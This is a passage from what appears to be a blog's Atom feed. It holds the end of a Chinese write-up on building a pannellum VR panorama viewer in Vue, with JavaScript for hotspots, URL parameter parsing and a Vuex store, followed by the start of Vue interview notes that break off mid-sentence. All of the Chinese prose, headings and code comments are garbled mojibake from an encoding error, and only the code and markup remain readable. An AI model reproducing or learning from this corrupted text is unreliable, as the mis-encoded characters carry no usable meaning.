éœ€é€šè¿‡<code>this.viewer.on</code>ç›‘å¬åœºæ™¯æ”¹å˜äº‹ä»¶ï¼Œä¸ºæ¯ä¸ªåœºæ™¯çš„hotSpotsæ·»åŠ ï¼š</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">hotSpots: [</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="attr">pitch</span>: -<span class="number">10</span>,</span><br><span class="line">    <span class="attr">yaw</span>: <span class="number">0</span>,</span><br><span class="line">    <span class="attr">type</span>: <span class="string">&quot;scene&quot;</span>,</span><br><span class="line">    <span class="comment">// åˆ å»sceneId</span></span><br><span class="line">    <span class="attr">cssClass</span>: <span class="string">&quot;custom-hotspot&quot;</span>,</span><br><span class="line">    <span class="attr">createTooltipFunc</span>: <span class="built_in">this</span>.hotspot,</span><br><span class="line">    <span class="attr">createTooltipArgs</span>: <span class="string">&quot;åŠå…¬åŒº up&quot;</span>,</span><br><span class="line">    <span class="attr">clickHandlerFunc</span>: <span class="built_in">this</span>.clickHotspot,</span><br><span class="line">    <span class="attr">clickHandlerArgs</span>: <span class="string">&quot;place2 1&quot;</span>,</span><br><span class="line">  &#125;,</span><br></pre></td></tr></table></figure><p>é€šè¿‡<code>clickHandlerArgs</code>ä¼ å…¥sceneIdå’Œindexï¼ˆcssåˆ—è¡¨æ”¹å˜æ ·å¼ï¼‰</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">//å¤„ç†ç‚¹å‡»çƒ­ç‚¹å‡½æ•°</span></span><br><span class="line"><span class="function"><span class="title">clickHotspot</span>(<span class="params">hotSpotDiv, args</span>)</span> &#123;</span><br><span class="line">  <span class="keyword">const</span> sceneId = args.split(<span class="string">&quot; &quot;</span>)[<span class="number">0</span>];</span><br><span class="line">  <span class="keyword">const</span> index = args.split(<span class="string">&quot; &quot;</span>)[<span class="number">1</span>];</span><br><span class="line">  <span class="keyword">let</span> btn = <span class="built_in">document</span></span><br><span class="line">    .getElementsByClassName(<span class="string">&quot;btn_list&quot;</span>)[<span class="number">0</span>]</span><br><span class="line">    .getElementsByTagName(<span class="string">&quot;div&quot;</span>);</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; btn.length; i++) &#123;</span><br><span class="line">    btn[i].className = <span class="string">&quot;btn&quot;</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  btn[index].className = <span class="string">&quot;btn_active&quot;</span>;</span><br><span class="line">  <span class="built_in">this</span>.viewer.loadScene(sceneId);</span><br></pre></td></tr></table></figure><p>æ„Ÿè§‰èµ·ç æ¯”æ–¹æ³•ä¸€switchè¯­å¥ç®€æ´å§ã€‚</p><p>æ­¤å¤–ï¼Œä¸ºäº†åœ¨åˆå§‹åŒ–åè°ƒç”¨<code>this.viewer</code>ï¼Œéœ€è¦å°†initå‡½æ•°å˜æˆä¸€ä¸ªå¼‚æ­¥å‡½æ•°ï¼Œå†é€šè¿‡äº‹ä»¶å¾ªç¯æœºåˆ¶å¤„ç†ã€‚æ­¤å¤„å‚è€ƒäº† <a href="https://www.jianshu.com/p/15a3f2b8613a">pannellum.js ä½¿ç”¨</a>ã€‚</p><h2 id="å…­ã€è·å–å°ç¨‹åºä¼ å‚ï¼ˆuserIdã€buildingIdç­‰ï¼‰"><a href="#å…­ã€è·å–å°ç¨‹åºä¼ å‚ï¼ˆuserIdã€buildingIdç­‰ï¼‰" class="headerlink" title="å…­ã€è·å–å°ç¨‹åºä¼ å‚ï¼ˆuserIdã€buildingIdç­‰ï¼‰"></a>å…­ã€è·å–å°ç¨‹åºä¼ å‚ï¼ˆuserIdã€buildingIdç­‰ï¼‰</h2><p>å°ç¨‹åºæ‹¼æ¥çš„ url ä¸­ï¼Œparamä¸ºï¼š<code>?userId=2c9a821c74ee8f0a017505c419d70092&amp;buildingId=2c9a821c641c2a9701642a35fc900000</code> è¿˜éœ€è¦æ ¹æ®ä¸åŒçš„ buildingId è¿›å…¥ä¸åŒçš„ VR é¡µé¢ã€‚</p><h3 id="å®ç°æ–¹æ¡ˆ-2"><a href="#å®ç°æ–¹æ¡ˆ-2" class="headerlink" title="å®ç°æ–¹æ¡ˆ"></a>å®ç°æ–¹æ¡ˆ</h3><p>ä¸€å¼€å§‹æ˜¯åœ¨å…·ä½“ vue æ–‡ä»¶ä¸­å¯¹ url è¿›è¡Œè§£æï¼š</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// created é’©å­å‡½æ•°ä¸­</span></span><br><span class="line"><span class="keyword">let</span> message = <span class="built_in">window</span>.location.href.split(<span class="string">&#x27;?&#x27;</span>)[<span class="number">1</span>];</span><br><span class="line"><span class="built_in">this</span>.userId = message.split(<span class="string">&#x27;&amp;&#x27;</span>)[<span class="number">0</span>].split(<span class="string">&#x27;=&#x27;</span>)[<span class="number">1</span>];</span><br><span class="line"><span class="built_in">this</span>.buildingId = message.split(<span class="string">&#x27;&amp;&#x27;</span>)[<span class="number">1</span>].split(<span class="string">&#x27;=&#x27;</span>)[<span class="number">1</span>];</span><br></pre></td></tr></table></figure><p>ä½†æ˜¯å‚è€ƒ<a href="https://blog.csdn.net/happy81997/article/details/103873840%EF%BC%8C%E5%AF%B9">https://blog.csdn.net/happy81997/article/details/103873840ï¼Œå¯¹</a> Vue å·¥ç¨‹è¿›è¡Œä¼˜åŒ–ï¼šåœ¨ src ç›®å½•ä¸‹æ–°å»º utils æ–‡ä»¶å¤¹ç»Ÿä¸€ç®¡ç†å·¥å…·å‡½æ•°ï¼Œä»£ç å¦‚ä¸‹ï¼š</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// getParam.js è¯¥å‡½æ•°ä½œç”¨ä¸ºæ ¹æ® str æŸ¥æ‰¾ url ä¸­å¯¹åº”çš„å€¼</span></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> <span class="function"><span class="keyword">function</span> <span class="title">getParam</span>(<span class="params">str,url</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">let</span> paramStr = <span class="string">&quot;&quot;</span>;</span><br><span class="line">    <span class="keyword">if</span> (url.indexOf(<span class="string">&quot;?&quot;</span>) != -<span class="number">1</span>)</span><br><span class="line">        paramStr = url.split(<span class="string">&quot;?&quot;</span>)[<span class="number">1</span>];</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">let</span> paramList = [], params = [];</span><br><span class="line">    <span class="keyword">if</span> (paramStr.indexOf(<span class="string">&quot;&amp;&quot;</span>) != -<span class="number">1</span>)</span><br><span class="line">        params = paramStr.split(<span class="string">&quot;&amp;&quot;</span>);</span><br><span class="line">    <span class="keyword">else</span> params.push(paramStr);</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; params.length; i++) &#123;</span><br><span class="line">        paramList[params[i].split(<span class="string">&quot;=&quot;</span>)[<span class="number">0</span>]] = params[i].split(<span class="string">&quot;=&quot;</span>)[<span class="number">1</span>]</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> paramList[str];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ç„¶ååœ¨ App.vue æ–‡ä»¶ä¸­å¯¼å…¥ getParam.js æ–‡ä»¶ï¼Œå°±èƒ½ç›´æ¥ä½¿ç”¨å‡½æ•° <code>let id = getParam(&quot;id&quot;, url)</code></p><p><strong>é—®é¢˜äºŒï¼š</strong></p><p>å®šä¹‰ getUrl å‡½æ•°ï¼Œæ ¹æ® id è¿”å› å¯¹åº”è·¯å¾„ï¼ˆå†™æ­»ï¼‰</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// utils ä¸‹çš„å·¥å…·å‡½æ•°æ–‡ä»¶</span></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> <span class="function"><span class="keyword">function</span> <span class="title">getUrl</span>(<span class="params">id</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">switch</span>(id) &#123;</span><br><span class="line">    <span class="keyword">case</span> <span class="string">&#x27;2c9a821c74046c7b01745c0c5edf05c7&#x27;</span>: </span><br><span class="line">      <span class="keyword">return</span> <span class="string">&#x27;/unitType1&#x27;</span>;</span><br><span class="line">    ...</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// App.vue ä¸­ </span></span><br><span class="line"><span class="function"><span class="title">created</span>(<span class="params"></span>)</span> &#123;</span><br><span class="line">  <span class="comment">// è·å–åœ°å€</span></span><br><span class="line">  <span class="keyword">let</span> url = <span class="built_in">window</span>.location.href</span><br><span class="line">  <span class="comment">// è·å–æºå¸¦çš„æˆ·å‹æˆ–è€…æ¥¼ç›˜id</span></span><br><span class="line">  <span class="keyword">let</span> id = getParam(<span class="string">&quot;id&quot;</span>, url)</span><br><span class="line">  <span class="comment">// å¦‚æœæœ‰userId,åˆ™å­˜å…¥vuex</span></span><br><span class="line">  <span class="keyword">if</span>(getParam(<span class="string">&quot;userId&quot;</span>, url)) &#123;</span><br><span class="line">    <span class="built_in">this</span>.$store.commit(<span class="string">&quot;setUserId&quot;</span>, getParam(<span class="string">&quot;userId&quot;</span>, url));</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="comment">// å¦‚æœæºå¸¦pathå‚æ•°,åˆ™ä¸ºåˆ†äº«å‡ºå»çš„VR,ç›´æ¥ç”¨pathè·³è½¬</span></span><br><span class="line">  <span class="keyword">if</span>(getParam(<span class="string">&quot;path&quot;</span>, url)) &#123;</span><br><span class="line">    <span class="built_in">this</span>.$router.replace(&#123;<span class="attr">path</span>: getParam(<span class="string">&quot;path&quot;</span>, url), <span class="attr">query</span>: &#123;<span class="attr">id</span>: id&#125;&#125;)</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="comment">// å¦‚æœä¸æºå¸¦,åˆ™ä½¿ç”¨æºå¸¦çš„æˆ·å‹æˆ–æ¥¼ç›˜idè¿›è¡Œè·¯ç”±åˆ†é…</span></span><br><span class="line">    <span class="built_in">this</span>.$router.replace(&#123;<span class="attr">path</span>: getPath(id), <span class="attr">query</span>: &#123;<span class="attr">id</span>: id&#125;&#125;)</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="æ³¨æ„ç‚¹"><a href="#æ³¨æ„ç‚¹" class="headerlink" title="æ³¨æ„ç‚¹"></a>æ³¨æ„ç‚¹</h1><h2 id="ä¸€ã€æ³¨å†Œçš„-listener-éœ€è¦åŠæ—¶é”€æ¯"><a href="#ä¸€ã€æ³¨å†Œçš„-listener-éœ€è¦åŠæ—¶é”€æ¯" class="headerlink" title="ä¸€ã€æ³¨å†Œçš„ listener éœ€è¦åŠæ—¶é”€æ¯"></a>ä¸€ã€æ³¨å†Œçš„ listener éœ€è¦åŠæ—¶é”€æ¯</h2><p>ä¸ºäº†ç›‘å¬é¡µé¢å˜åŒ–ï¼Œä»è€Œå®ç°å“åº”å¼é¡µé¢ï¼ˆremï¼‰ï¼Œæ³¨å†Œäº† â€˜resizeâ€™ çš„ listenerï¼Œè·å¾—æ ¹å…ƒç´ çš„å¤§å°ã€‚ä½†æ˜¯åœ¨ destroyed çš„ç”Ÿå‘½å‘¨æœŸé‡Œéœ€è¦ remove ï¼š</p><p><img src="https://i.loli.net/2021/08/14/qpCBWlLrvf1igam.png" alt="QQå›¾ç‰‡20210814154420.png"></p><p>å¦åˆ™ç›‘å¬ä¼šä¸€ç›´å­˜åœ¨ï¼Œå› ä¸ºè¿™æ˜¯å•é¡µé¢åº”ç”¨ï¼Œ é¡µé¢å¹¶æœªå…³é—­ã€‚</p><h2 id="äºŒã€url-ä¸­è·å–çš„-userId-åº”å­˜å…¥-Vuex"><a href="#äºŒã€url-ä¸­è·å–çš„-userId-åº”å­˜å…¥-Vuex" class="headerlink" title="äºŒã€url ä¸­è·å–çš„ userId åº”å­˜å…¥ Vuex"></a>äºŒã€url ä¸­è·å–çš„ userId åº”å­˜å…¥ Vuex</h2><p>æ–°å»º store æ–‡ä»¶å¤¹ï¼Œåœ¨é‡Œé¢çš„ index.js ä¸­ï¼š</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> Vue <span class="keyword">from</span> <span class="string">&#x27;vue&#x27;</span></span><br><span class="line"><span class="keyword">import</span> Vuex <span class="keyword">from</span> <span class="string">&#x27;vuex&#x27;</span></span><br><span class="line"></span><br><span class="line">Vue.use(Vuex)</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> store = <span class="keyword">new</span> Vuex.Store(&#123;</span><br><span class="line">  <span class="attr">state</span>: &#123;</span><br><span class="line">    <span class="attr">userId</span>: <span class="string">&#x27;&#x27;</span></span><br><span class="line">  &#125;,</span><br><span class="line">  <span class="attr">mutations</span>: &#123;</span><br><span class="line">    <span class="function"><span class="title">setUserId</span>(<span class="params">state,id</span>)</span> &#123;</span><br><span class="line">      state.userId = id;</span><br><span class="line">      sessionStorage.userId = id;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;)</span><br><span class="line"><span class="keyword">if</span> (sessionStorage.getItem(<span class="string">&quot;userId&quot;</span>)) &#123;</span><br><span class="line">  store.commit(<span class="string">&quot;setUserId&quot;</span>, sessionStorage.getItem(<span class="string">&quot;userId&quot;</span>))</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> store;</span><br></pre></td></tr></table></figure><h1 id="é¡¹ç›®æ€»ç»“"><a href="#é¡¹ç›®æ€»ç»“" class="headerlink" title="é¡¹ç›®æ€»ç»“"></a>é¡¹ç›®æ€»ç»“</h1><p>è¿™ä¸€ä¸ªé¡¹ç›®æœ€éš¾çš„è¿˜æ˜¯å¯¹pannellumç»„ä»¶çš„å­¦ä¹ ï¼š</p><ul><li>å…¥é—¨è¾ƒéš¾ï¼Œèµ·åˆåœ¨å„å¤§æœç´¢å¼•æ“æœªèƒ½æ‰¾åˆ°ä¸é¡¹ç›®é¢„æœŸç›¸å…³æ€§å¾ˆé«˜çš„ä»£ç ï¼Œåªèƒ½ä»0æ‘¸ç´¢ï¼Œè¿›åº¦è¾ƒæ…¢ã€‚ï¼ˆè™½ç„¶åæœŸé€šè¿‡ç²¾ç¡®æœç´¢å…³é”®è¯æ‰¾åˆ°äº†å¾ˆå¤šç›¸å…³æ–‡ç« ï¼Œä¹Ÿè§£å†³äº†ä¸€å †é—®é¢˜ï¼‰</li><li>éœ€å¯¹ç…§è‹±æ–‡æ–‡æ¡£æŸ¥æ‰¾æ¯ä¸€ä¸ªapiçš„æ„æ€å¹¶æ·±åˆ»ç†è§£ï¼Œå…¶ä¸­ç”±äºå¯¹ loadScene çš„å¿½è§†ï¼Œå¯¼è‡´é‡å†™äº†è¿‘ä¸¤æ¬¡ä»£ç ï¼Œè€—è´¹äº†å¤§é‡çš„æ—¶é—´ã€‚</li><li>éœ€é€‚å½“è¿›è¡Œå¯¹ä¸€äº› parameter è¿›è¡Œæ‹“å±•ï¼Œä¸é¡¹ç›®éœ€æ±‚ç›¸é€‚åº”ã€‚</li></ul><p>æ”¶è·æœ€å¤§çš„æ˜¯ï¼š</p><ul><li>ç¬¬ä¸€æ¬¡åœ¨githubä¸Šå‘issueä¸pannellumç»„ä»¶çš„ä½œè€…è¿›è¡Œäº¤æµï¼Œå¹¶å¾—åˆ°äº†æœ€åçš„è§£å†³æ–¹æ³•ã€‚</li><li>ç¬¬ä¸€æ¬¡å‘ç°å¾ˆå¤šè‡ªå·±ä¸ä¼šçš„é—®é¢˜å…¶ä»–äººè‚¯å®šéƒ½é‡åˆ°è¿‡ï¼Œå°±çœ‹è‡ªå·±èƒ½ä¸èƒ½æ‰¾åˆ°ã€‚æ¯”å¦‚åœ¨pannellumä»“åº“çš„issueä¸­æœ‰è¿‘åƒä¸ªæé—®ï¼Œå››å¹´ä¹‹å‰å°±æœ‰äººé—®å…³äºçƒ­ç‚¹ç‚¹å‡»äº‹ä»¶çš„ä¿®æ”¹é—®é¢˜äº†ã€‚è€Œå½“åˆè‡ªå·±åˆšä½¿ç”¨pannellumç»„ä»¶æ—¶ï¼Œåªç²—ç•¥çœ‹äº†ä¸€ä¸‹æ–‡æ¡£ï¼Œå®Œå…¨æ²¡æœ‰äº†è§£issueä¸Šçš„é—®é¢˜ã€‚</li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;å‰è¨€-amp-èƒŒæ™¯&quot;&gt;&lt;a href=&quot;#å‰è¨€-amp-èƒŒæ™¯&quot; class=&quot;headerlink&quot; title=&quot;å‰è¨€&amp;amp;èƒŒæ™¯&quot;&gt;&lt;/a&gt;å‰è¨€&amp;amp;èƒŒæ™¯&lt;/h1&gt;&lt;p&gt;æœ¬æ–‡æ˜¯æˆ‘å¯¹å®éªŒå®¤æ ¡ä¼åˆä½œé¡¹ç›®â€”â€”â€œåŸºäºpannellumçš„å…¨æ™¯å®ç°â€çš„å¤ç›˜æ€»ç»“ã€‚ç›®å‰</summary>
      
    
    
    
    <category term="é¡¹ç›®å¤ç›˜" scheme="http://example.com/categories/%E9%A1%B9%E7%9B%AE%E5%A4%8D%E7%9B%98/"/>
    
    
    <category term="pannellum" scheme="http://example.com/tags/pannellum/"/>
    
  </entry>
  
  <entry>
    <title>ã€é¢è¯•å‡†å¤‡ã€‘â€” â€” Vueç¯‡</title>
    <link href="http://example.com/2021/07/10/%E3%80%90%E9%9D%A2%E8%AF%95%E5%87%86%E5%A4%87%E3%80%91%E2%80%94%20%E2%80%94%20Vue%E7%AF%87/"/>
    <id>http://example.com/2021/07/10/%E3%80%90%E9%9D%A2%E8%AF%95%E5%87%86%E5%A4%87%E3%80%91%E2%80%94%20%E2%80%94%20Vue%E7%AF%87/</id>
    <published>2021-07-10T14:02:20.000Z</published>
    <updated>2021-09-18T03:03:11.427Z</updated>
    
    <content type="html"><![CDATA[<h1 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h1><p>æœ¬æ–‡æ˜¯æˆ‘åœ¨å¤ä¹ Vueï¼Œå‡†å¤‡å®ä¹ é¢è¯•æ—¶æ•´ç†çš„ç¬”è®°ï¼Œå‚è€ƒè‡ªä¸€äº›å·²ç»æ•´ç†å¥½çš„åšå®¢ï¼š<a href="https://github.com/CavsZhouyou/Front-End-Interview-Notebook/blob/master/Css/Css.md">CSS é¢è¯•çŸ¥è¯†ç‚¹æ€»ç»“</a>ã€‚ä¾µæƒåˆ ã€‚</p><h2 id="Vue-çš„ç”Ÿå‘½å‘¨æœŸæ˜¯ä»€ä¹ˆï¼Ÿ"><a href="#Vue-çš„ç”Ÿå‘½å‘¨æœŸæ˜¯ä»€ä¹ˆï¼Ÿ" class="headerlink" title="Vue çš„ç”Ÿå‘½å‘¨æœŸæ˜¯ä»€ä¹ˆï¼Ÿ"></a>Vue çš„ç”Ÿå‘½å‘¨æœŸæ˜¯ä»€ä¹ˆï¼Ÿ</h2><p>Vue çš„ç”Ÿå‘½å‘¨æœŸæŒ‡çš„æ˜¯ç»„ä»¶ä»åˆ›å»ºåˆ°é”€æ¯çš„ä¸€ç³»åˆ—çš„è¿‡ç¨‹ï¼Œè¢«ç§°ä¸º Vue çš„ç”Ÿå‘½å‘¨æœŸã€‚é€šè¿‡æä¾›çš„ Vue åœ¨ç”Ÿå‘½å‘¨æœŸå„ä¸ªé˜¶æ®µçš„é’©å­å‡½æ•°ï¼Œæˆ‘ä»¬å¯ä»¥å¾ˆå¥½çš„åœ¨ Vue çš„å„ä¸ªç”Ÿå‘½é˜¶æ®µå®ç°ä¸€äº›æ“ä½œã€‚</p><h2 id="Vue-çš„å„ä¸ªç”Ÿå‘½é˜¶æ®µæ˜¯ä»€ä¹ˆï¼Ÿ"><a href="#Vue-çš„å„ä¸ªç”Ÿå‘½é˜¶æ®µæ˜¯ä»€ä¹ˆï¼Ÿ" class="headerlink" title="Vue çš„å„ä¸ªç”Ÿå‘½é˜¶æ®µæ˜¯ä»€ä¹ˆï¼Ÿ"></a>Vue çš„å„ä¸ªç”Ÿå‘½é˜¶æ®µæ˜¯ä»€ä¹ˆï¼Ÿ</h2><p>Vue ä¸€å…±æœ‰8ä¸ªç”Ÿå‘½é˜¶æ®µï¼Œåˆ†åˆ«æ˜¯åˆ›å»ºå‰ã€åˆ›å»ºåã€åŠ è½½å‰ã€åŠ è½½åã€æ›´æ–°å‰ã€æ›´æ–°åã€é”€æ¯å‰å’Œé”€æ¯åï¼Œæ¯ä¸ªé˜¶æ®µå¯¹åº”äº†ä¸€ä¸ªç”Ÿå‘½å‘¨æœŸçš„é’©å­å‡½æ•°ã€‚</p><p>ï¼ˆ1ï¼‰beforeCreateï¼šåœ¨å®ä¾‹åˆå§‹åŒ–ä¹‹åï¼Œåœ¨æ•°æ®ç›‘å¬å’Œäº‹ä»¶é…ç½®ä¹‹å‰è§¦å‘ã€‚å› æ­¤åœ¨è¿™ä¸ªäº‹ä»¶ä¸­æˆ‘ä»¬æ˜¯è·å–ä¸åˆ° props æˆ–è€… data æ•°æ®çš„ã€‚</p><p>ï¼ˆ2ï¼‰createdï¼šåœ¨å®ä¾‹åˆ›å»ºå®Œæˆåè§¦å‘ï¼Œæ­¤æ—¶å¯ä»¥è®¿é—® dataã€methods ç­‰å±æ€§ã€‚ä½†è¿™ä¸ªæ—¶å€™ç»„ä»¶è¿˜æ²¡æœ‰è¢«æŒ‚è½½åˆ°é¡µé¢ä¸­å»ï¼Œæ‰€ä»¥è¿™ä¸ªæ—¶å€™è®¿é—®ä¸åˆ° $el å±æ€§ã€‚ä¸€èˆ¬æˆ‘ä»¬å¯ä»¥åœ¨è¿™ä¸ªå‡½æ•°ä¸­è¿›è¡Œä¸€äº›é¡µé¢åˆå§‹åŒ–çš„å·¥ä½œï¼Œæ¯”å¦‚é€šè¿‡ ajax è¯·æ±‚æ•°æ®æ¥å¯¹é¡µé¢è¿›è¡Œåˆå§‹åŒ–ã€‚</p><p>ï¼ˆ3ï¼‰beforeMountï¼šåœ¨ç»„ä»¶è¢«æŒ‚è½½åˆ°é¡µé¢ä¹‹å‰è§¦å‘ã€‚åœ¨ beforeMount ä¹‹å‰ï¼Œä¼šæ‰¾åˆ°å¯¹åº”çš„ templateï¼Œå¹¶ç¼–è¯‘æˆ render å‡½æ•°ã€‚</p><p>ï¼ˆ4ï¼‰mountedï¼šåœ¨ç»„ä»¶æŒ‚è½½åˆ°é¡µé¢ä¹‹åè§¦å‘ã€‚æ­¤æ—¶å¯ä»¥é€šè¿‡ DOM API è·å–åˆ°é¡µé¢ä¸­çš„ DOM å…ƒç´ ã€‚</p><p>ï¼ˆ5ï¼‰beforeUpdateï¼šåœ¨å“åº”å¼æ•°æ®æ›´æ–°æ—¶è§¦å‘ï¼Œå‘ç”Ÿåœ¨è™šæ‹Ÿ DOM é‡æ–°æ¸²æŸ“å’Œæ‰“è¡¥ä¸ä¹‹å‰ï¼Œè¿™ä¸ªæ—¶å€™æˆ‘ä»¬å¯ä»¥å¯¹å¯èƒ½ä¼šè¢«ç§»é™¤çš„å…ƒç´ åšä¸€äº›æ“ä½œï¼Œæ¯”å¦‚ç§»é™¤äº‹ä»¶ç›‘å¬å™¨ã€‚</p><p>ï¼ˆ6ï¼‰updatedï¼šè™šæ‹Ÿ DOM é‡æ–°æ¸²æŸ“å’Œæ‰“è¡¥ä¸ä¹‹åè°ƒç”¨ã€‚</p><p>ï¼ˆ7ï¼‰beforeDestroyï¼šåœ¨å®ä¾‹é”€æ¯ä¹‹å‰è°ƒç”¨ã€‚ä¸€èˆ¬åœ¨è¿™ä¸€æ­¥æˆ‘ä»¬å¯ä»¥é”€æ¯å®šæ—¶å™¨ã€è§£ç»‘å…¨å±€äº‹ä»¶ç­‰ã€‚</p><p>ï¼ˆ8ï¼‰destroyedï¼šåœ¨å®ä¾‹é”€æ¯ä¹‹åè°ƒç”¨ï¼Œè°ƒç”¨åï¼ŒVue å®ä¾‹ä¸­çš„æ‰€æœ‰ä¸œè¥¿éƒ½ä¼šè§£é™¤ç»‘å®šï¼Œæ‰€æœ‰çš„äº‹ä»¶ç›‘å¬å™¨ä¼šè¢«ç§»é™¤ï¼Œæ‰€æœ‰çš„å­å®ä¾‹ä¹Ÿä¼šè¢«é”€æ¯ã€‚</p><p>å½“æˆ‘ä»¬ä½¿ç”¨ keep-alive çš„æ—¶å€™ï¼Œè¿˜æœ‰ä¸¤ä¸ªé’©å­å‡½æ•°ï¼Œåˆ†åˆ«æ˜¯ activated å’Œ deactivated ã€‚ç”¨ keep-alive åŒ…è£¹çš„ç»„ä»¶åœ¨åˆ‡æ¢æ—¶ä¸ä¼šè¿›è¡Œé”€æ¯ï¼Œè€Œæ˜¯ç¼“å­˜åˆ°å†…å­˜ä¸­å¹¶æ‰§è¡Œ deactivated é’©å­å‡½æ•°ï¼Œå‘½ä¸­ç¼“å­˜æ¸²æŸ“åä¼šæ‰§è¡Œ actived é’©å­å‡½æ•°ã€‚</p><h2 id="Vue-åŒå‘æ•°æ®ç»‘å®šåŸç†ï¼Ÿ"><a href="#Vue-åŒå‘æ•°æ®ç»‘å®šåŸç†ï¼Ÿ" class="headerlink" title="Vue åŒå‘æ•°æ®ç»‘å®šåŸç†ï¼Ÿ"></a>Vue åŒå‘æ•°æ®ç»‘å®šåŸç†ï¼Ÿ</h2><p>vue é€šè¿‡ä½¿ç”¨åŒå‘æ•°æ®ç»‘å®šï¼Œæ¥å®ç°äº† View å’Œ Model çš„åŒæ­¥æ›´æ–°ã€‚vue çš„åŒå‘æ•°æ®ç»‘å®šä¸»è¦æ˜¯é€šè¿‡ä½¿ç”¨æ•°æ®åŠ«æŒå’Œå‘å¸ƒè®¢é˜…è€…æ¨¡å¼æ¥å®ç°çš„ã€‚</p><p>é¦–å…ˆæˆ‘ä»¬é€šè¿‡ Object.defineProperty() æ–¹æ³•æ¥å¯¹ Model æ•°æ®å„ä¸ªå±æ€§æ·»åŠ è®¿é—®å™¨å±æ€§ï¼Œä»¥æ­¤æ¥å®ç°æ•°æ®çš„åŠ«æŒï¼Œå› æ­¤å½“ Model ä¸­çš„æ•°æ®å‘ç”Ÿå˜åŒ–çš„æ—¶å€™ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡é…ç½®çš„ setter å’Œ getter æ–¹æ³•æ¥å®ç°å¯¹ View å±‚æ•°æ®æ›´æ–°çš„é€šçŸ¥ã€‚</p><p>æ•°æ®åœ¨ html æ¨¡æ¿ä¸­ä¸€å…±æœ‰ä¸¤ç§ç»‘å®šæƒ…å†µï¼Œä¸€ç§æ˜¯ä½¿ç”¨ v-model æ¥å¯¹ value å€¼è¿›è¡Œç»‘å®šï¼Œä¸€ç§æ˜¯ä½œä¸ºæ–‡æœ¬ç»‘å®šï¼Œåœ¨å¯¹æ¨¡æ¿å¼•æ“è¿›è¡Œè§£æçš„è¿‡ç¨‹ä¸­ã€‚</p><p>å¦‚æœé‡åˆ°å…ƒç´ èŠ‚ç‚¹ï¼Œå¹¶ä¸”å±æ€§å€¼åŒ…å« v-model çš„è¯ï¼Œæˆ‘ä»¬å°±ä» Model ä¸­å»è·å– v-model æ‰€å¯¹åº”çš„å±æ€§çš„å€¼ï¼Œå¹¶èµ‹å€¼ç»™å…ƒç´ çš„ value å€¼ã€‚ç„¶åç»™è¿™ä¸ªå…ƒç´ è®¾ç½®ä¸€ä¸ªç›‘å¬äº‹ä»¶ï¼Œå½“ View ä¸­å…ƒç´ çš„æ•°æ®å‘ç”Ÿå˜åŒ–çš„æ—¶å€™è§¦å‘è¯¥äº‹ä»¶ï¼Œé€šçŸ¥ Model ä¸­çš„å¯¹åº”çš„å±æ€§çš„å€¼è¿›è¡Œæ›´æ–°ã€‚</p><p>å¦‚æœé‡åˆ°äº†ç»‘å®šçš„æ–‡æœ¬èŠ‚ç‚¹ï¼Œæˆ‘ä»¬ä½¿ç”¨ Model ä¸­å¯¹åº”çš„å±æ€§çš„å€¼æ¥æ›¿æ¢è¿™ä¸ªæ–‡æœ¬ã€‚å¯¹äºæ–‡æœ¬èŠ‚ç‚¹çš„æ›´æ–°ï¼Œæˆ‘ä»¬ä½¿ç”¨äº†å‘å¸ƒè®¢é˜…è€…æ¨¡å¼ï¼Œå±æ€§ä½œä¸ºä¸€ä¸ªä¸»é¢˜ï¼Œæˆ‘ä»¬ä¸ºè¿™ä¸ªèŠ‚ç‚¹è®¾ç½®ä¸€ä¸ªè®¢é˜…è€…å¯¹è±¡ï¼Œå°†è¿™ä¸ªè®¢é˜…è€…å¯¹è±¡åŠ å…¥è¿™ä¸ªå±æ€§ä¸»é¢˜çš„è®¢é˜…è€…åˆ—è¡¨ä¸­ã€‚å½“ Model å±‚æ•°æ®å‘ç”Ÿæ”¹å˜çš„æ—¶å€™ï¼ŒModel ä½œä¸ºå‘å¸ƒè€…å‘ä¸»é¢˜å‘å‡ºé€šçŸ¥ï¼Œä¸»é¢˜æ”¶åˆ°é€šçŸ¥å†å‘å®ƒçš„æ‰€æœ‰è®¢é˜…è€…æ¨é€ï¼Œè®¢é˜…è€…æ”¶åˆ°é€šçŸ¥åæ›´æ”¹è‡ªå·±çš„æ•°æ®ã€‚</p><h2 id="Vue-å“åº”å¼åŸç†ï¼Ÿ"><a href="#Vue-å“åº”å¼åŸç†ï¼Ÿ" class="headerlink" title="Vue å“åº”å¼åŸç†ï¼Ÿ"></a>Vue å“åº”å¼åŸç†ï¼Ÿ</h2><p>Vue å†…éƒ¨ä½¿ç”¨äº† <code>Object.defineProperty()</code> 